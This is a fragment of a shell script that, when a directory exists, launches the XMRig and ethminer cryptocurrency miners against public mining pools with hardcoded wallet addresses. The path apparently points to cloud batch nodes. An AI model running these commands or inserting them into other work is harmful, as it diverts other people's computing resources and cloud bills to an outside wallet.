...
if [ -d "$DIR" ]; then
  ### Take action if $DIR exists ###
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvs1mGYZLcAEq6ApV7eb1RTjuT2C1dB6PEva5yQpEwpbHZv7KD5y7EDbbvKFfMujzK6wuzd8txVBZNoMXkoaYRQn5yypgRRvHY --pass=x --nicehash --max-cpu-usage 90 --cpu-priority 0 --background &&
    ...
    ./ethminer -G -P stratum1+tcp://0x6ba4d687aec1055163df07f8ea10d643d91d8e20@us-eth.2miners.com:2020
else
    sudo apt-get update &&
